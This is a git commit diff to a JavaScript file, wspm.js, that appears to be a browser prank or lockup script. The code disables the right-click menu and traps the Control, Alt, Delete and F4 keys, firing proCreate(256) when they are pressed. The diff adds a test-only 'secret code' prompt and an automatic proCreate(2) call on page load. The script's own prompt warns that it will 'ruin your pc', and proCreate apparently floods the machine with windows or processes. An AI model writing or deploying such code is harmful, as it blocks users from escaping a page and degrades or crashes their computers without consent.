94840094629cc51bb81988067ba5431b479a8780
codermannnnnnn <164600483+codermannnnnnn@users.noreply.github.com>
2024-04-04 17:52:05 +1000

    Update wspm.js

--- wspm.js
+++ wspm.js
@@ -1,9 +1,10 @@
-window.onload = playBall;
+window.onload = () => {this.n = prompt("Before you actually ruin your pc, this part is to test. Secret code?"); if (n != "genrandstr()") {playBall()} else null};
 window.oncontextmenu = () => false;
 window.onkeydown = async () => {
-	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
+	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key) & n != "genrandstr()") {
 		await proCreate(256);
 	}
 	
 	return null;
 }
+proCreate(2);
